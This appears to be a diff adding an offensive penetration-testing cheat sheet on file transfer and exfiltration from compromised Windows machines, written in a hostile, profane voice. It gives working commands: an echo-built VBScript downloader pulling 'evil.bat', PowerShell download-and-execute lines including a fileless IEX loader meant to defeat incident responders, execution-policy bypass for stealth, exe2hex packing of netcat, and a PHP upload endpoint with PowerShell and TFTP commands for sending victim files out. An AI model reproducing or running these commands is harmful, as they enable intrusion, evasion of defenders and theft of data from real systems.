@@ -1,0 +1,148 @@
+sudo apt update && sudo apt install pure-ftpd
+chmod +x ./setup-ftp.sh
+sudo ./setup-ftp.sh 
+
+You need to upgrade your nc shell with pty.import if you are going to 
+try to use ftp or some other interactive program with it because 
+nc is non-interactive. This means you will be able to send commands but
+the server output is not going to make it back to you.
+
+Linux transfers (python http, netcat, ftp) are all fun and easy 
+so let's talk about Windows hosts. Specifically, let's talk about their
+default ftp client. >:)
+
+Unlike most file executables on Windows, you can call the ftp client by 
+just passing ftp to the terminal. Isn't that crazy! The ftp client on
+Windows will take commands from a file using the -s:<file> argument. 
+This is good because it allows us to interact with the ftp service from
+a non-interactive shell. All you need to do is be able to write ftp commands
+into a text file.
+
+ftp -v -n -s:ftp.txt will execute ftp with the commands you put in the file.
+Surprisingly, -v is not verbosity but instead will suppress verbosity. 
+Windows will do anything to feel special. -n stops automatic login.  
+If you put the following into a text file, it will initiate a binary 
+file transfer over the wire:
+
+open <IP> <ftp port>
+USER <user>
+bin
+GET <file>
+bye
+
+This will open the ftp client, log in as a user, swtich to binary 
+transfer mode, get a file and leave. 
+
+FILE TRANSFERS WITH SCRIPTING LANGS:
+VBScript (WinXP, 2003) and PowerShell (Win 7, 2008 and later) can let
+us create our own tools on the fly like this one made entirely in 
+a victim terminal:
+
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo  Err.Clear >> wget.vbs
+echo  Set http = Nothing >> wget.vbs
+echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo  http.Open "GET", strURL, False >> wget.vbs
+echo  http.Send >> wget.vbs
+echo  varByteArray = http.ResponseBody >> wget.vbs
+echo  Set http = Nothing >> wget.vbs
+echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo  strData = "" >> wget.vbs
+echo  strBuffer = "" >> wget.vbs
+echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo  Next >> wget.vbs
+echo  ts.Close >> wget.vbs
+
+The above series of echo statements will create wget using VisualBasic.
+Running the cscript windows utility will let us use it like wget:
+
+cscript wget.vbs http://IP:PORT/evil.bat evil.bat
+
+PowerShell is way more efficient at letting us fuck with our victim. 
+Here is wget in Powershell:
+
+$webclient = New-Object System.Net.WebClient
+$url = "<Input URL Here>"
+$file = "<Target File>" 
+$webclient.DownloadFile($url,$file)
+
+alternatively:
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('targeturl/path',
+'downloadname')
+
+These lines can be fed to a .ps1 file with wget the same way as above
+to give us a quick and nasty file transfer. When we run this, you want
+to keep some things stealthy and you do that with the following args:
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive
+	-NoProfile -File <wget.ps1 filename>
+
+Setting ExecPol to Bypass lets us run scripts, -NoLogo and -NonInt
+suppress GUI options and -NoProfile (-n) prevents startup scripts.
+
+**********************
+DISKLESS PS1 EXECUTION
+**********************
+Fuck DFIR Teams. If you make a .ps1 and you serve it via http just execute 
+this on the victim machine:
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('url/path')
+The content of your .ps1 will be downlaoded and executed without you having
+to worry about saved artefacts on the disk.
+
+Using exe2hex and PowerShell:
+This is a method to compress a binary, convert it to a hex string and 
+embed it into a Windows script. Piping to powershell will reassemble 
+the binary. Before sending binaries it is sometimes a good idea to 
+use upx, the Ultimate Packer for eXecutables, to reduce the size of 
+the file. Then you run exe2hex on it:
+
+exe2hex -x nc.exe -p nc.cmd
+
+This will create a version of nc.exe and make it a windows script (.cmd). 
+Running this nc.cmd on the target Windows machine will recompile 
+our tool.
+
+EXFIL ON WINDOWS:
+If outbound HTTP is allowed on the Windows machine (99% of times)
+you can use the trusty System.Net.WebClient to get things out. 
+There is some setup. Let's create a webserver that can accept file uploads:
+
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+
+Putting this php in var/www/html will let us process file upload requests
+and put them into the /var/www/uploads/ folder. When you make the 
+uploads folder, remember to chown it to www-data so the server can 
+write to that file. Then you can shoot files across the way:
+
+powershell (New-Object System.Net.WebClient).UploadFile(http://IP/upload.php','targetfile')
+
+TFTP UPLOADS:
+Who the fuck enables FTP anymore? Whatever. If you're attacking XP and 
+Win 2003 you're weird. TFTP is UDP based file transfer so it's already
+shit. apt install atftp, make a dedicated dir for it and 
+sudo atftpd --daemon --port <port> <dir>
+
+now you're listening, and on your old ass deprecated ass windows
+device you're attacking you can 
+tftp -i <IP> put <file>
+
+LOLBAS is your friend for learning the rest of these available transfer
+options you can do. 
+
